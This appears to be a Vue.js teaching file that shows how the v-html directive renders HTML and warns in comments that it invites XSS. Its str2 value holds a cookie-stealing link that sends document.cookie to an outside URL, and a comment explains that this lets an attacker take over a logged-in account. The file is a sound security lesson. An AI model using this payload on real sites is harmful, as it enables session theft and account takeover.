<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="../../JS/vue.js"></script>
</head>
<body>
<!--v-html指令：
    1.作用：向指定节点中渲染包含html结构的内容
    2.与插值语法的区别：
        (1).v-html会替换节点中的所有内容，{{xxx}}不会
        (2).v-html可以识别html结构
    3.严重注意：v-html有安全性问题
        (1).在网站上动态渲染HTML是非常危险的，容易导致xxs攻击
        (2).一定要在可信的内容上使用v-html，用不要用在用户提交的内容上
-->
<div id="root">
    <div>你好，{{name}}</div>
    <!--    此时我们可以看出str当中的标签被解析了，这就是v-html和v-text的区别-->
    <div v-html="str"></div>
    <div v-html="str2"></div>
</div>

</body>
<script>
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: '小红',
            str: '<h3>河北</h3>',
            // 携带本网站cookie跳转到指定网址，这样就可以获取用户的登陆数据从而不需要再次登陆就可以直接登陆被盗用户账号
            str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>快点我'
        }
    })
</script>
</html>
